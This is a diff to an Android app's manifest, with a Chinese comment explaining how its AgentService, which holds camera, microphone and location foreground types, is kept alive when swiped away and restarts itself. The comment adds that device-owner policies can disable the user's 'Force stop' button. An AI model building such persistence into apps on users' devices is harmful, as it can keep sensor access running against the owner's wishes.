@@ -170,9 +170,19 @@
             android:theme="@style/Theme.BalloonDog.Transparent" />
 
         <!-- ================= 服务 ================= -->
+        <!--
+          AgentService 的长活配置（需求 2）：
+          - stopWithTask="false"：划掉最近任务时不跟着任务一起销毁；
+          - foregroundServiceType：进前台，避免被当作后台进程优先回收；
+          - 代码里 onStartCommand 返回 START_STICKY，并在 onTaskRemoved 里主动重启自己。
+          这些只能守住「划掉 / 低内存回收 / ROM 后台清理」；设置页里的「强行停止」
+          一旦生效，任何闹钟、Job、广播都唤不醒本应用 —— 那一条只能靠设备所有者的
+          setUserControlDisabledPackages + DISALLOW_APPS_CONTROL 把按钮变灰。
+        -->
         <service
             android:name=".service.AgentService"
             android:exported="false"
+            android:stopWithTask="false"
             android:foregroundServiceType="dataSync|camera|microphone|location" />
 
         <service
